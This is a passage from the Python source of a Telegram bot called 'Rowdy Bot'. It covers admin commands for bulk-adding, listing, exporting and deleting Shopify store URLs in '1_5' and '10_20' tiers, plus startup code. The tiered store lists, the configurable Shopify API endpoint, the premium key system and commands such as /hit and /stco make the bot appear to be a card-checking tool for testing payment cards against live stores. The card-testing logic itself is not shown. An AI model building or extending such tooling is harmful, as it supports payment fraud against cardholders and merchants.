        await event.reply(premium_emoji(f"⚠️ Site already in <b>{tier}</b> list."), parse_mode='html')
        return
    with open(fp, 'a', encoding='utf-8') as f:
        f.write(f"{url}\n")
    total = len(existing) + 1
    await event.reply(premium_emoji(f"✅ <b>Site added to {tier} list.</b>\n{BOT_ICON} <b>Total:</b> {total} sites"), parse_mode='html')

# ---------- /addsites — BULK add via file or paste ----------
@bot.on(events.NewMessage(pattern=r'^/addsites\b'))
async def addsites_command(event):
    """Bulk add sites to sites_1_5.txt.
    Usage options:
      1. /addsites <tier>  — reply to a .txt file
      2. /addsites <tier>  — then paste URLs in same message (one per line after command)
    tier: 1_5 or 10_20
    """
    if not is_admin(event.sender_id): return
    text_parts = event.message.text.split(None, 1)
    tier_arg = text_parts[1].strip().lower().split('\n')[0].strip() if len(text_parts) > 1 else ''

    # Determine tier
    if tier_arg in ('1_5',):
        fp = SITES_1_5_FILE
        tier = '1_5'
    elif tier_arg in ('10_20', '10-20'):
        fp = SITES_10_20_FILE
        tier = '10_20'
    else:
        await event.reply(premium_emoji(
            "❌ <b>Usage:</b>\n"
            "<code>/addsites 1_5</code> — reply to .txt file\n"
            "<code>/addsites 10_20</code> — reply to .txt file\n\n"
            "<b>Or paste inline:</b>\n"
            "<code>/addsites 1_5\nhttps://store1.com\nhttps://store2.com</code>"
        ), parse_mode='html')
        return

    content = ""

    # Try inline paste first (URLs after the tier arg on new lines)
    full_text = event.message.text
    lines_after_cmd = full_text.split('\n')[1:]  # everything after first line
    inline_urls = [l.strip() for l in lines_after_cmd if l.strip().startswith('http')]

    if inline_urls:
        content = '\n'.join(inline_urls)
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if rm.file and rm.file.name and (rm.file.name.endswith('.txt') or rm.file.name.endswith('.csv')):
            fp_dl = await rm.download_media()
            async with aiofiles.open(fp_dl, 'r', encoding='utf-8', errors='ignore') as fh:
                content = await fh.read()
            try: os.remove(fp_dl)
            except: pass
        elif rm.text and rm.text.strip():
            content = rm.text
        else:
            await event.reply(premium_emoji("❌ Reply to a .txt file or paste URLs inline after the tier argument."), parse_mode='html')
            return
    else:
        await event.reply(premium_emoji(
            "❌ No sites found.\n\n"
            "<b>Paste inline:</b> <code>/addsites 1_5\nhttps://store1.com\nhttps://store2.com</code>\n"
            "<b>Or reply to a .txt file.</b>"
        ), parse_mode='html')
        return

    # Extract all URLs from content
    url_re = re.compile(r'https?://[^\s,;|"\'<>]+')
    found_urls = url_re.findall(content)
    # Also grab bare domains like store.myshopify.com
    bare_re = re.compile(r'(?:^|\s)([a-zA-Z0-9][-a-zA-Z0-9.]+\.[a-zA-Z]{2,})(?:\s|$)')
    bare_hits = [f"https://{m}" for m in bare_re.findall(content) if '.' in m and not m.startswith('http')]
    all_candidates = [u.rstrip('.,;)') for u in found_urls + bare_hits]
    # Deduplicate preserving order
    seen = set()
    candidates = []
    for u in all_candidates:
        if u not in seen:
            seen.add(u)
            candidates.append(u)

    if not candidates:
        await event.reply(premium_emoji("❌ No valid URLs found in the input."), parse_mode='html')
        return

    existing = get_file_lines(fp)
    existing_set = set(existing)
    new_sites = [u for u in candidates if u not in existing_set]
    dupes = len(candidates) - len(new_sites)

    if not new_sites:
        await event.reply(premium_emoji(f"⚠️ All {len(candidates)} sites already exist in the <b>{tier}</b> list."), parse_mode='html')
        return

    with open(fp, 'a', encoding='utf-8') as fh:
        for site in new_sites:
            fh.write(f"{site}\n")

    total_now = len(existing) + len(new_sites)
    report = (
        f"✅ <b>Bulk Sites Added — {tier} tier</b>\n"
        f"────────────\n"
        f"📥 <b>Parsed:</b> {len(candidates)}\n"
        f"✅ <b>Added:</b> {len(new_sites)}\n"
        f"⚠️ <b>Dupes skipped:</b> {dupes}\n"
        f"📦 <b>Total in list:</b> {total_now}\n"
        f"────────────\n"
        f"{BOT_ICON} <b>Run /chksites to verify all are live.</b>"
    )
    await event.reply(premium_emoji(report), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/listsites\b'))
async def listsites_command(event):
    if not is_admin(event.sender_id): return
    s1 = get_file_lines(SITES_1_5_FILE)
    s2 = get_file_lines(SITES_10_20_FILE)
    def fmt(lst):
        return '\n'.join(f"  <code>{i+1}. {s}</code>" for i, s in enumerate(lst)) if lst else '  <i>None</i>'
    text = (
        f"{BOT_ICON} <b>Sites — 1_5 Tier ({len(s1)})</b>\n{fmt(s1)}\n\n"
        f"{BOT_ICON} <b>Sites — 10_20 Tier ({len(s2)})</b>\n{fmt(s2)}"
    )
    for chunk in [text[i:i+3000] for i in range(0, len(text), 3000)]:
        await event.reply(premium_emoji(chunk), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/exportsites\b'))
async def exportsites_command(event):
    if not is_admin(event.sender_id): return
    s1 = load_sites_1_5()
    s2 = load_sites_10_20()
    if not s1 and not s2:
        await event.reply(premium_emoji("❌ No sites to export."), parse_mode='html')
        return
    await event.reply(premium_emoji(
        f"📄 <b>Exporting sites...</b>\n"
        f"1_5 tier: {len(s1)} sites\n"
        f"10_20 tier: {len(s2)} sites"
    ), parse_mode='html')
    if s1:
        await event.client.send_file(
            event.chat_id,
            file="\n".join(s1).encode('utf-8'),
            attributes=[],
            caption=premium_emoji(f"✅ <b>Alive Sites — 1_5 tier ({len(s1)} total)</b>"),
            force_document=True,
            file_name="alive_sites_1_5.txt",
            parse_mode='html'
        )
    if s2:
        await event.client.send_file(
            event.chat_id,
            file="\n".join(s2).encode('utf-8'),
            attributes=[],
            caption=premium_emoji(f"✅ <b>Alive Sites — 10_20 tier ({len(s2)} total)</b>"),
            force_document=True,
            file_name="alive_sites_10_20.txt",
            parse_mode='html'
        )

@bot.on(events.NewMessage(pattern=r'^/delsite\s+'))
async def delsite_command(event):
    if not is_admin(event.sender_id): return
    args = event.message.text.split(None, 2)
    if len(args) < 3:
        await event.reply(premium_emoji("❌ Usage: <code>/delsite 1_5 https://example.com</code>"), parse_mode='html')
        return
    tier, url = args[1].strip().lower(), args[2].strip()
    if tier == '1_5':
        fp = SITES_1_5_FILE
    elif tier in ('10_20', '10-20'):
        fp = SITES_10_20_FILE
    else:
        await event.reply(premium_emoji("❌ Tier must be <code>1_5</code> or <code>10_20</code>"), parse_mode='html')
        return
    existing = get_file_lines(fp)
    if url not in existing:
        await event.reply(premium_emoji("⚠️ Site not found in that list."), parse_mode='html')
        return
    with open(fp, 'w', encoding='utf-8') as f:
        for s in existing:
            if s != url:
                f.write(f"{s}\n")
    await event.reply(premium_emoji(f"🗑 <b>Site removed from {tier} list.</b>"), parse_mode='html')

# ---------- STARTUP ----------
async def auto_add_admins():
    for a in ADMIN_IDS:
        if str(a) not in load_premium_users():
            with open(PREMIUM_FILE, 'a') as f: f.write(f"{a}\n")

def init_data_files():
    """Touch all required data files on startup so get_file_lines never sees a missing path."""
    global SHOPI_API_URL
    for fp in [SITES_1_5_FILE, SITES_10_20_FILE, BANNED_FILE, PREMIUM_FILE]:
        if not os.path.exists(fp):
            open(fp, 'w', encoding='utf-8').close()
    # Load persisted API URL if set via /setapi
    saved = load_api_url()
    if saved and saved != SHOPI_API_URL:
        SHOPI_API_URL = saved

if __name__ == "__main__":
    init_data_files()
    bot.loop.run_until_complete(auto_add_admins())
    print("=" * 50)
    print("✅ Rowdy Bot STARTED!")
    print("🚀 /start  /info  /plan  /sp  /msp  /hit  /stco  /jio")
    print("🌐 /addsite  /listsites  /delsite  (admin — site management)")
    print("📬 /feedback  |  🔑 /key /redeem")
    print("=" * 50)
    bot.run_until_disconnected()
